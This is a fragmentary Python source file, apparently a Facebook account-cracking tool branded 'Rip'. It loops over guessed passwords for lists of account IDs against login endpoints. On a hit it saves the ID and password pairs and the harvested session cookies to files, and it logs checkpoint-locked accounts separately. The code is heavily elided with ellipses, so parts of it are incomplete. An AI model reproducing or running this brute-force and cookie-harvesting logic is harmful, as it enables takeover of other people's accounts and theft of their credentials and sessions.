...
\033[1;96m ━━━━━━━━━━━━━━━━━━━\033[1;31mRip\33[38;5;196m━━━━━━━━━━━━━━━━━━━━
\x1b[1;36m{+} \x1b[1;91mTOOL CREATED BY   \x1b[1;97m:Rip
...
def ffb(ids,names,passlist):
        ...
        sys.stdout.write('\r\r\033[1;36m [\033[1;32mRip\033[1;36m] \033[1;36m[\033[1;31m%s\033[1;36m] \033[1;36m[\033[1;32mOK\033[1;30m:-\033[1;32m%s\033[1;36m] \033[1;36m[\033[1;33m%s%%\033[1;36m]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
    ...
    # 'cookie': 'datr=mGHeZOfchFXp0qElgM8Vjy-Q; fr=0MxzeyDEM1q47rYEO..Bk3mGY.kS.AAA.0.0.Bk3mGY.AWVAKwf-3hE; sb=mGHeZPh71aNFIIMjVJ6qE8A0; m_pixel_ratio=2.75; wd=393x768',
    'dpr': '2.75',
    ...
    "user-agent": ua,
                        ...
                        if "c_user" in ASX:
                                ...
                                open('/sdcard/Rip-COOKIE.txt','a').write(coki+'\n')
                                open('/sdcard/Rip-OK.txt', 'a').write(ids+'|'+pas+'\n')
                                oks.append(ids)
                                break
                        elif 'checkpoint' in ASX:
                                if 'y' in pcp:
                                        print('\r\r\x1b[38;5;208m [Rip-CP] '+ids+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Rip-CP.txt', 'a').write(ids+'|'+pas+'\n')
                                        cps.append(ids)
                                        break
                                else:
                                        break
...
def api(ids,names,passlist):
                try:
                        global ok,loop,lim
                        p=round(loop*100/lim,2)
                        sys.stdout.write('\r\r\033[1;37m [Rip] [%s] \033[1;37m[OK=%s] [%s%%]\033[1;37m'%(loop,len(oks),p));sys.stdout.flush()
                        fn = names.split(' ')[0]
                        try:
                                ln = names.split(' ')[1]
                        except:
                        ...
                        for pw in passlist:
                             ...
                             'viewport-width': '980',}
                                ...
                                q = json.loads(po)
                                if 'session_key' in q:
                                        print('\r\r\033[1;32m [Rip-OK] '+ids+' | '+pas+'\033[1;97m')
    ...
    'viewport-width': '980',
                                ...
                                if 'session_key' in q:
                                        ...
                                        if 'y' in pcp:
                                                ...
                                                open('/sdcard/RipCP.txt','a').write(ids+'|'+pas+'\n')
                                                break
                                else:
                                        continue
                        loop+=1
    ...
    'viewport-width': '980',
                        ...
                        if 'session_key' in po:
                                ...
                                if str(uid) in oks:
                                        ...
                                        print('\r\r\033[1;32m [Rip-OK] '+str(uid)+' | '+pas+'\033[1;97m')
                                        coki = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        open('/sdcard/Rip-COOKIE.txt','a').write(coki+'\n')
                                        open('/sdcard/Rip_OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                                ...
                                if uid in oks:pass
                                        ...
                                        print('\r\r\x1b[38;5;208m [Rip-CP] '+str(uid)+' | '+pas+'\033[1;97m')
                                        open('/sdcard/Rip-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
